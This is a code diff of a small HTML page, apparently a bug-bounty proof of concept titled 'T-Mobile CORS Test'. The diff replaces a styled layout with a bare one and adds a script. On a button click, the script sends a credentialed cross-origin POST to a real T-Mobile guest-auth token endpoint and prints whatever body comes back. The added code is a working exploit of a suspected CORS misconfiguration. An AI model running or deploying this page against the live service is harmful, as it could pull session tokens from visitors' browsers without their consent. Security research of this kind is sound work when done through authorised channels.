@@ -1,37 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>T-Mobile Bug Bounty PoC</title>
-    <style>
-        body { font-family: sans-serif; padding: 30px; background-color: #f9f9f9; }
-        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; border: 2px solid #e20074; }
-        h1 { color: #e20074; text-align: center; }
-        #runBtn { 
-            display: block; width: 100%; padding: 20px; font-size: 1.2em; 
-            background-color: #e20074; color: white; border: none; 
-            border-radius: 5px; cursor: pointer; font-weight: bold; 
-        }
-        #runBtn:hover { background-color: #b1005b; }
-        #output { 
-            margin-top: 20px; background: #222; color: #0f0; 
-            padding: 15px; border-radius: 5px; min-height: 150px; 
-            overflow: auto; white-space: pre-wrap; font-family: monospace;
-        }
-        .info { font-size: 0.85em; color: #666; margin-top: 10px; }
-    </style>
+    <title>T-Mobile PoC</title>
 </head>
-<body>
+<body style="font-family:sans-serif; padding:40px;">
 
-<div class="container">
-    <h1>CORS Bypass Test</h1>
-    <p>Target: <code>adn.t-mobile.com/.../tokens</code></p>
+    <h1>T-Mobile CORS Test</h1>
+    <p>Check the browser console (F12) to see progress.</p>
     
-    <button id="runBtn">FIRE BYPASS REQUEST</button>
+    <button id="runBtn" style="padding:15px 30px; background:#e20074; color:white; border:none; cursor:pointer;">
+        FIRE REQUEST
+    </button>
     
-    <h3>Result Output:</h3>
-    <pre id="output">Click the button above. If the box stays green/empty but the Network tab shows a 200, the data is being "leaked" but blocked by the browser UI.</pre>
+    <div style="margin-top:20px;">
+        <strong>Log:</strong>
+        <pre id="output" style="background:#eee; padding:15px; border:1px solid #ccc;">Waiting for click...</pre>
+    </div>
 
-    <div class="info">
-        <b>Note:</b> We
+    <script>
+        // Log immediately to prove the script is alive
+        console.log("Script loaded and running.");
+
+        document.getElementById('runBtn').onclick = function() {
+            console.log("Button was clicked!");
+            var output = document.getElementById('output');
+            output.innerText = "Button clicked! Firing request...";
+
+            var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();
+            
+            console.log("Fetching from:", target);
+
+            fetch(target, {
+                method: 'POST',
+                mode: 'cors',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: '{"grant_type":"guest"}'
+            })
+            .then(function(response) {
+                console.log("Response received with status:", response.status);
+                output.innerText = "Status: " + response.status;
+                return response.text();
+            })
+            .then(function(data) {
+                console.log("Data received:", data);
+                output.innerText += "\n\nBody: " + data;
+            })
+            .catch(function(err) {
+                console.error("Fetch error:", err);
+                output.innerText = "Error: " + err;
+            });
+        };
+    </script>
+</body>
+</html>
